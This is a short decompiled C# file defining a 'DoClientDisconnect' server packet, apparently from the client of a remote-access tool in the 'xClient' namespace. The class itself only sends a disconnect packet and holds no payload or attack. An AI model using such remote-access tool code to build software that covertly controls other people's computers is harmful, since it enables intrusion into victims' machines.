using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x020000DB RID: 219
	[Serializable]
	public class DoClientDisconnect : IPacket
	{
		// Token: 0x0600058F RID: 1423 RVA: 0x00004A97 File Offset: 0x00002C97
		public void Execute(Client client)
		{
			client.Send<DoClientDisconnect>(this);
		}
	}
}
